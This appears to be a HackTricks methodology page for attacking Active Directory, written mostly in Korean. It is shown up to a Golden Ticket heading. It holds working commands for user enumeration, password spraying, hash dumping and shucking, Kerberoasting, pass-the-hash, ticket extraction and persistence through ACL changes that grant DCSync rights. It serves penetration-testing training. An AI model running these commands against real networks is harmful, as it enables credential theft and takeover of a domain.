# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 네트워크 관리자가 네트워크 내에서 **도메인**, **사용자**, **개체**를 효율적으로 생성하고 관리할 수 있게 해주는 핵심 기술입니다. 대규모 사용자들을 관리 가능한 **그룹**과 **하위 그룹**으로 구성하고, 다양한 수준에서 **접근 권한**을 제어하도록 설계되어 있습니다.

**Active Directory**의 구조는 주로 세 가지 계층으로 구성됩니다: **domains**, **trees**, 그리고 **forests**. **domain**은 공통 데이터베이스를 공유하는 **사용자**나 **장치** 같은 개체들의 모음입니다. **trees**는 공통 구조로 연결된 도메인들의 그룹이고, **forest**는 여러 trees가 **trust relationships**를 통해 상호 연결된 조직 구조의 최상위 계층입니다. 각 계층별로 특정 **접근** 및 **통신 권한**을 지정할 수 있습니다.

**Active Directory**의 주요 개념:

1. **Directory** – Active Directory 객체와 관련된 모든 정보를 보관합니다.
2. **Object** – 디렉터리 내의 엔터티를 의미하며, **사용자**, **그룹**, **공유 폴더** 등이 포함됩니다.
3. **Domain** – 디렉터리 객체들을 포함하는 컨테이너로, 여러 도메인이 **forest** 내에 공존할 수 있으며 각 도메인은 자체 객체 컬렉션을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인들의 그룹입니다.
5. **Forest** – Active Directory의 최상위 조직 구조로, 여러 트리로 구성되며 그들 간에 **trust relationships**가 존재합니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙화된 관리와 통신에 중요한 여러 서비스를 포함합니다. 이들 서비스는 다음을 포함합니다:

1. **Domain Services** – 데이터를 중앙화하여 저장하고 **사용자**와 **도메인** 간의 상호작용(예: **authentication**, **search**)을 관리합니다.
2. **Certificate Services** – 보안 **디지털 인증서**의 생성, 배포 및 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 디렉터리 기반 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 여러 웹 애플리케이션 간 **single-sign-on** 기능을 제공하여 한 세션으로 사용자 인증을 처리합니다.
5. **Rights Management** – 저작권 자료의 무단 배포 및 사용을 제어하여 보호를 돕습니다.
6. **DNS Service** – **domain names** 해석에 필수적입니다.

자세한 설명은 다음을 참고하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD를 공격하는 방법을 이해하려면 **Kerberos 인증 프로세스**를 정말 잘 이해해야 합니다.\
[**이 페이지를 아직 모른다면 읽으세요.**](kerberos-authentication.md)

## Cheat Sheet

빠르게 어떤 명령으로 AD를 열거/익스플로잇할 수 있는지 보려면 [https://wadcoms.github.io/](https://wadcoms.github.io) 를 참고하세요.

> [!WARNING]
> Kerberos 통신은 작업을 수행할 때 전체 정규화된 도메인 이름(fully qualified domain name, FQDN)을 요구합니다. 머신에 IP 주소로 접근을 시도하면 **NTLM을 사용하고 Kerberos를 사용하지 않습니다**.

## Recon Active Directory (No creds/sessions)

AD 환경에 접근 권한은 있지만 크리덴셜/세션이 없는 경우 할 수 있는 작업들:

- **Pentest the network:**
- 네트워크를 스캔하여 머신과 열린 포트를 찾고 **취약점 익스플로잇**이나 그들로부터 **자격증명 추출**을 시도합니다(예: [프린터가 흥미로운 표적일 수 있음](ad-information-in-printers.md)).
- DNS 열거는 도메인 내의 주요 서버(예: 웹, 프린터, 공유, vpn, 미디어 등)에 대한 정보를 제공할 수 있습니다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 더 많은 정보는 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 참조하세요.
- **smb 서비스에서 null 및 Guest 접근 확인** (현대 Windows 버전에서는 동작하지 않을 수 있음):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB 서버 열거에 대한 보다 자세한 가이드는 다음에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP 열거에 대한 자세한 가이드는 다음을 참조하세요 (특히 **익명 접근**에 주의):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder로 **서비스를 가장하여 자격증명 수집** ([참고 링크](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md))
- [**relay attack**을 남용하여 호스트 접근](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- 악성-S **UPnP 서비스를 노출**하여 자격증명 수집 (evil-S) ([SDP 참고](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856))
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, 소셜 미디어, 도메인 내부 서비스(주로 웹) 및 공개적으로 이용 가능한 자료에서 사용자명/이름을 추출합니다.
- 회사 직원의 전체 이름을 찾았다면 다양한 AD **username conventions**을 시도해볼 수 있습니다 ([**참고**](https://activedirectorypro.com/active-directory-user-naming-convention/)). 가장 일반적인 규칙은: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 무작위 3글자 + 무작위 3숫자(abc123) 등입니다.
- 도구:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute enum**: 잘못된 username이 요청되면 서버는 **Kerberos 오류** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_을 반환하여 해당 username이 유효하지 않음을 알립니다. **유효한 사용자명**은 AS-REP 응답에서 **TGT**를 반환하거나 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류를 반환하여 해당 사용자가 사전 인증(pre-authentication)을 요구함을 나타냅니다.
- **No Authentication against MS-NRPC**: 도메인 컨트롤러의 MS-NRPC(Netlogon) 인터페이스에 대해 auth-level = 1 (No authentication)을 사용하는 방법입니다. 해당 방법은 MS-NRPC 인터페이스에 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 자격 증명 없이 사용자나 컴퓨터가 존재하는지 확인합니다. 이 유형의 열거를 구현한 도구는 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)입니다. 관련 연구는 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 찾았다면 **user enumeration against it**도 수행할 수 있습니다. 예를 들어, 도구 [**MailSniper**](https://github.com/dafthack/MailSniper)를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### 하나 또는 여러 사용자 이름을 알고 있는 경우

이미 유효한 사용자 이름은 알고 있지만 비밀번호는 모르는 상황이라면, 다음을 시도해보세요:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않다면**, 해당 사용자에 대해 AS_REP 메시지를 요청할 수 있으며, 이 메시지는 사용자 비밀번호에서 파생된 일부 데이터로 암호화되어 있습니다.
- [**Password Spraying**](password-spraying.md): 발견한 각 사용자에 대해 가장 **흔한 비밀번호들**을 시도해보세요. 어떤 사용자가 약한 비밀번호를 사용하고 있을 수 있습니다(비밀번호 정책을 유의하세요!).
- 또한 **OWA servers**를 대상으로도 스프레이하여 사용자 메일 서버 접근을 시도할 수 있습니다.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 프로토콜을 poisoning하여 크랙할 수 있는 challenge hashes를 얻을 수 있습니다:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory를 열거하는 데 성공했다면 더 많은 이메일 주소와 네트워크에 대한 이해도를 얻었을 것입니다. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제하여 AD 환경에 접근할 수 있을지도 모릅니다.

### Steal NTLM Creds

null 또는 guest 사용자로 다른 PC나 공유에 접근할 수 있다면, SCF 파일 같은 파일을 배치해서 누군가 접근할 경우 당신에게 NTLM 인증을 트리거하도록 만들고, 그렇게 발생한 NTLM challenge를 훔쳐 크래킹할 수 있습니다:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT hash를, 해당 NT hash에서 직접 키 재료가 파생되는 다른 느린 포맷에 대한 후보 비밀번호로 취급합니다. Kerberos RC4 티켓, NetNTLM 챌린지, 혹은 cached credentials에서 긴 패스프레이즈를 무차별 대입하는 대신, NT hash들을 Hashcat의 NT-candidate 모드에 넣어 평문을 알지 못한 채로 비밀번호 재사용을 검증할 수 있습니다. 도메인 침해 이후 수천 개의 현재 및 과거 NT hash를 수집한 상황에서 특히 강력합니다.

다음과 같은 경우에 shucking을 사용하세요:

- **DCSync/NTDS** – `secretsdump.py`를 히스토리 옵션과 함께 사용해 가능한 한 많은 NT hash(및 이전 값들)를 확보하세요:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

히스토리 항목은 계정당 최대 24개의 이전 해시를 저장할 수 있기 때문에 후보 풀을 크게 넓혀줍니다. NTDS 비밀을 수집하는 더 많은 방법은 다음을 참조하세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)로 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그인(DCC/DCC2)을 추출하세요. 중복을 제거한 뒤 동일한 `nt_candidates.txt` 리스트에 추가합니다.
- **메타데이터 추적** – 각 해시를 만든 username/domain을 함께 보관하세요(워드리스트가 헥스만 포함하더라도). 매칭된 해시는 Hashcat이 승리 후보를 출력하는 즉시 어떤 주체가 비밀번호를 재사용했는지 알려줍니다.
- 후보는 같은 포리스트나 신뢰된 포리스트에서 나온 것을 우선하세요; shucking 성공 확률이 높아집니다.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. 대상 SPN을 위해 RC4 TGS를 캡처하세요(자세한 내용은 Kerberoast 페이지 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT 리스트로 티켓을 shuck 하세요:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT 후보로부터 RC4 키를 유도하여 `$krb5tgs$23$...` 블랍을 검증합니다. 매치가 확인되면 서비스 계정이 기존 NT hash 중 하나를 사용하고 있음을 확정할 수 있습니다.

3. 즉시 PtH로 피벗하세요:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

필요하다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`로 평문을 복구할 수도 있습니다.

#### Example – Cached credentials (mode 31600)

1. 침해된 워크스테이션에서 캐시된 로그온을 덤프하세요:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 관심 있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`로 복사하고 shuck 하세요:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적인 매치는 이미 목록에 있는 NT hash와 일치함을 보여주며, 캐시된 사용자가 비밀번호를 재사용하고 있음을 입증합니다. 이를 PtH에 직접 사용하거나(`nxc smb <dc_ip> -u highpriv -H <hash>`) 빠른 NTLM 모드로 오프라인에서 문자열을 복호화할 수 있습니다.

동일한 워크플로우가 NetNTLM challenge-responses (`-m 27000/27100`)와 DCC (`-m 31500`)에도 적용됩니다. 매치가 확인되면 relay, SMB/WMI/WinRM PtH를 실행하거나 NT hash를 오프라인에서 마스크/룰로 재크랙할 수 있습니다.

## 자격증명/세션이 있는 상태에서 Active Directory 열거

이 단계에서는 유효한 도메인 계정의 자격증명이나 세션을 **이미 침해(획득)** 했어야 합니다. 유효한 자격증명이나 도메인 사용자로서의 쉘이 있다면, 이전에 제시된 옵션들(다른 사용자를 침해하기 위한 방법들)은 여전히 사용할 수 있다는 점을 기억하세요.

인증된 열거를 시작하기 전에 **Kerberos double hop problem**을 알고 있어야 합니다.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 열거

계정을 침해했다는 것은 전체 도메인을 침해로 이어갈 수 있는 큰 발판입니다. 이제 Active Directory 열거를 시작할 수 있기 때문입니다:

[**ASREPRoast**](asreproast.md)의 경우 이제 취약한 모든 사용자를 찾을 수 있고, [**Password Spraying**](password-spraying.md)을 통해 모든 사용자 이름 목록을 얻어 침해한 계정의 비밀번호, 빈 비밀번호, 또는 유망해 보이는 새 비밀번호들을 시도해볼 수 있습니다.

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)를 사용해 기본 reconnaissance를 수행할 수 있습니다.
- [**powershell for recon**](../basic-powershell-for-pentesters/index.html)를 사용하면 더 은밀하게 정보를 수집할 수 있습니다.
- 더 자세한 정보를 추출하려면 [**use powerview**](../basic-powershell-for-pentesters/powerview.md)를 사용할 수 있습니다.
- Active Directory에서 리콘에 탁월한 또 다른 도구는 [**BloodHound**](bloodhound.md)입니다. 수집 방법에 따라 **매우 은밀하지는 않지만**, 은밀성에 신경 쓰지 않는다면 꼭 사용해볼 가치가 있습니다. 사용자가 RDP 가능한 곳을 찾고, 다른 그룹으로 가는 경로를 찾는 등 유용합니다.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md)는 흥미로운 정보를 포함하고 있을 수 있습니다.
- 디렉토리를 열거할 수 있는 GUI 도구로는 **SysInternal** Suite의 **AdExplorer.exe**가 있습니다.
- ldapsearch로 LDAP 데이터베이스를 검색해 _userPassword_ 및 _unixUserPassword_ 필드나 _Description_에서 자격증명을 찾을 수도 있습니다. 다른 방법들은 PayloadsAllTheThings의 해당 섹션을 참조하세요: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment
- **Linux**를 사용 중이라면 [**pywerview**](https://github.com/the-useless-one/pywerview)를 이용해 도메인을 열거할 수 있습니다.
- 다음과 같은 자동화 도구들도 시도해볼 수 있습니다:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출**

Windows에서는 `net user /domain`, `Get-DomainUser` 또는 `wmic useraccount get name,sid`로 모든 도메인 사용자 이름을 쉽게 얻을 수 있습니다. Linux에서는 `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>` 등을 사용할 수 있습니다.

> 이 Enumeration 섹션이 짧아 보일지라도, 이것이 전체에서 가장 중요한 부분입니다. (mainly the one of cmd, powershell, powerview and BloodHound) 링크들을 방문하여 도메인 열거 방법을 배우고 충분히 연습하세요. 평가 중에 이 단계가 DA로 가는 길을 찾거나 더 이상 진행할 수 없다고 판단하는 결정적 순간이 될 것입니다.

### Kerberoast

Kerberoasting은 사용자 계정에 연결된 서비스가 사용하는 **TGS tickets**를 획득하고, 이 티켓들을 사용자 비밀번호 기반의 암호화된 내용을 **오프라인**에서 크래킹하는 것을 포함합니다.

자세한 내용은 다음을 참조하세요:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

자격증명을 획득했다면 특정 머신에 접근할 수 있는지 확인하세요. 이를 위해 포트 스캔 결과에 따라 여러 서버에 다양한 프로토콜로 연결을 시도할 때 CrackMapExec을 사용할 수 있습니다.

### Local Privilege Escalation

정규 도메인 사용자로서 자격증명이나 세션을 획득했고, 해당 사용자로 도메인 내 어떤 머신에 접근할 수 있다면 로컬 권한 상승을 시도하고 자격증명을 탈취해야 합니다. 로컬 관리자 권한이 있어야만 다른 사용자들의 해시를 메모리(LSASS)와 로컬(SAM)에서 덤프할 수 있기 때문입니다.

이 책에는 [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html)에 대한 전체 페이지와 체크리스트(../checklist-windows-privilege-escalation.md)가 있으며, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 잊지 말고 사용하세요.

### Current Session Tickets

현재 사용자에게 있는 티켓이 예기치 않은 자원에 접근 권한을 주고 있을 가능성은 매우 낮지만, 다음을 확인해볼 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **더 많은 이메일과 네트워크에 대한 더 나은 이해**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본 credentials가 있으므로 AD 내부에서 **흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 할 수 있지만 매우 지루하고 반복적인 작업입니다(확인해야 할 문서가 수백 개라면 더 그렇습니다).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

만약 다른 **PCs**나 **shares**에 **access**할 수 있다면, **place files**(예: SCF file)같은 파일을 배치해서 누군가 접근하면 당신을 대상으로 **NTLM authentication을 트리거**하도록 만들 수 있고, 이를 통해 **NTLM challenge를 steal**하여 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 어떤 사용자라도 **compromise the domain controller**할 수 있게 허용했습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

운이 좋다면 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relay 포함), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) 등을 사용해 **compromise some local admin** 계정을 확보했을 것입니다.\
그런 다음 메모리와 로컬에서 모든 해시를 덤프할 시간입니다.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
어떤 **tool**을 사용해 해당 **hash**를 이용한 **NTLM authentication을 수행**하게 하거나, 새로운 **sessionlogon**을 생성하고 그 **hash**를 **LSASS** 내부에 **inject**하여 이후 발생하는 모든 **NTLM authentication**에 그 **hash**가 사용되게 할 수 있습니다. 마지막 옵션은 mimikatz가 하는 방식입니다.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 Pass The Hash over NTLM 프로토콜의 대안으로, **user NTLM hash를 사용해 Kerberos 티켓을 요청**하는 것을 목적으로 합니다. 따라서 NTLM 프로토콜이 비활성화되어 있고 인증 프로토콜로 **Kerberos만 허용되는 네트워크에서 특히 유용할 수 있습니다.**


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이는 상당히 **노이즈가 크며** **LAPS**가 이를 **완화**할 수 있다는 점에 유의하세요.

### MSSQL 악용 및 신뢰된 링크

사용자가 **MSSQL 인스턴스에 액세스할 권한**이 있다면, (만약 SA로 실행 중이면) MSSQL 호스트에서 **명령을 실행**하거나 NetNTLM **hash**를 **탈취**하거나 심지어 **relay attack**을 수행할 수 있습니다.\
또한 한 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰(database link)되어 있는 경우, 사용자가 신뢰된 데이터베이스에 대한 권한을 가지고 있으면 **신뢰 관계를 이용해 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 체인으로 연결될 수 있으며, 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수 있습니다.\
**데이터베이스 간 링크는 포리스트 트러스트(forest trusts) 간에도 작동합니다.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 자산/배포 플랫폼 악용

서드파티 인벤토리 및 배포 솔루션은 종종 자격증명 및 코드 실행으로 이어지는 강력한 경로를 노출합니다. 참조:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

속성이 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)인 Computer 객체를 찾고 해당 컴퓨터에 대한 도메인 권한이 있다면, 그 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 해당 컴퓨터에 로그인하면**, 그의 TGT를 덤프하고 [Pass the Ticket](pass-the-ticket.md)를 사용해 그를 가장할 수 있습니다.\
constrained delegation 덕분에 **Print Server를 자동으로 장악**할 수도 있습니다(운 좋게도 DC일 수도 있습니다).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터가 "Constrained Delegation"을 허용받으면 해당 컴퓨터의 특정 서비스에 접근하기 위해 **임의의 사용자를 가장할 수 있습니다**.\
따라서 이 사용자/컴퓨터의 **hash를 탈취**하면 (심지어 Domain Admins도) **임의의 사용자를 가장하여** 일부 서비스에 접근할 수 있습니다.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대해 **WRITE** 권한이 있으면 **권한 상승된 코드 실행**을 달성할 수 있습니다:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 권한/ACL 악용

탈취된 사용자는 일부 도메인 객체에 대해 **유용한 권한**을 가지고 있어 횡적 이동/권한 **상승**을 할 수 있습니다.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 프린터 스풀러 서비스 악용

도메인 내에서 **Spool 서비스가 리스닝하고 있는** 경우 이를 **악용하여 새로운 자격증명을 획득**하고 **권한을 상승**시킬 수 있습니다.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 제3자 세션 악용

다른 사용자가 **침해된** 머신에 **접속**하면 메모리에서 **자격증명을 수집**하거나 그들의 프로세스에 **beacon을 주입**해 그들을 가장할 수 있습니다.\
일반적으로 사용자는 RDP로 시스템에 접근하므로, 다음은 타 사용자 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법입니다:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

LAPS는 도메인 가입 컴퓨터의 로컬 Administrator 비밀번호를 관리하는 시스템을 제공하며, 비밀번호를 **무작위화**, 고유화, 그리고 빈번하게 **변경**되도록 합니다. 이 비밀번호들은 Active Directory에 저장되며 접근은 ACL을 통해 권한이 있는 사용자만 제어됩니다. 이러한 비밀번호에 접근할 충분한 권한이 있으면 다른 컴퓨터로 피벗하는 것이 가능해집니다.

{{#ref}}
laps.md
{{#endref}}

### 인증서 탈취

침해된 머신에서 **인증서 수집**은 환경 내 권한 상승 방법이 될 수 있습니다:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 인증서 템플릿 악용

취약한 템플릿이 구성되어 있으면 이를 악용해 권한을 상승시킬 수 있습니다:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 고권한 계정으로의 포스트 익스플로잇

### 도메인 자격증명 덤프

Domain Admin 또는 더 나아가 Enterprise Admin 권한을 얻으면, 도메인 데이터베이스: _ntds.dit_를 **덤프**할 수 있습니다.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### 권한 상승을 이용한 지속성 확보

앞서 논의한 몇몇 기법은 지속성(persistence)으로 사용할 수 있습니다.\
예를 들어 다음을 수행할 수 있습니다:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

